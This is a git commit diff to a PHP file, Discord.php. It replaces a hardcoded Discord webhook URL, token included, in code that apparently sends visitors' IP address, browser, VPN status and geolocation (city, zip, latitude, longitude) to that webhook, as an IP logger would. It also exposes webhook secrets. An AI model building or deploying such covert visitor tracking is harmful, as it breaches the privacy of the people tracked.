05bd1f9dede8e3ed66bb46e6084158bce358f246
CasperNyra <buluymusab@gmail.com>
2026-01-15 17:49:59 +0300

    Update Discord.php

--- Discord.php
+++ Discord.php
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "https://canary.discord.com/api/webhooks/1461371236952309771/q8ZA8gyf60yi2wP2MyE4Pj-9EFS1ZgCOvzhyAPKoWj3HGpog6xQUDkIdAcLOgazVMg-m";
+        $Webhook = "https://canary.discord.com/api/webhooks/1457482515378995387/hFwOk91ysaqLx3zO6B7ZW-tzazbYp-bsdR1C97TeH0RrkcMKRuegG2LJdIi0Avx4nnG5";
 
         $InfoArr = array(
             "username" => "$WebhookName",
@@ -115,4 +115,5 @@ class Discord
 }
 
 ?>
+
 
